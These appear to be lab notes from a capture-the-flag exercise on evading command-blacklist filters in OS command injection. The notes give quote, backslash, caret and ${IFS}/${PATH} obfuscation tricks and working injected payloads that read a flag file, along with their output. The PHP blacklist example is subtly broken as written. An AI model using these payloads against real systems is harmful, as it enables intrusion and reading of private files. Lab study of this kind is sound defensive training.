# Bypassing Blacklisted Commands

## Commands Blacklist

A basic command blacklist filter in PHP would look like the following:

$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}

## Linux & Windows

Certain characters within our command that are usually ignored by command shells like Bash or PowerShell :

w'h'o'am'i
w"h"o"am"i

## Linux Only

We can insert a few other Linux-only characters in the middle of commands, and the bash shell would ignore them :
who$@ami
w\ho\am\i

## Windows Only

who^ami

## LAB

127.0.0.1%0ac'at${IFS}/home/1nj3c70r/flag.txt

Invalid input


127.0.0.1%0a{ls,-la}${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r

/home/1nj3c70r:
total 12
drwxr-xr-x 1 1nj3c70r 1nj3c70r 4096 Jul 16  2021 .
drwxr-xr-x 1 root     root     4096 Jul 16  2021 ..
-rw-r--r-- 1 1nj3c70r 1nj3c70r   32 Jul 16  2021 flag.txt

127.0.0.1%0ac'at${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt

--> Failed

127.0.0.1%0ac"a"t"${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms

127.0.0.1%0ac"a"t${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.013/0.013/0.013/0.000 ms
HTB{b451c_f1l73r5_w0n7_570p_m3}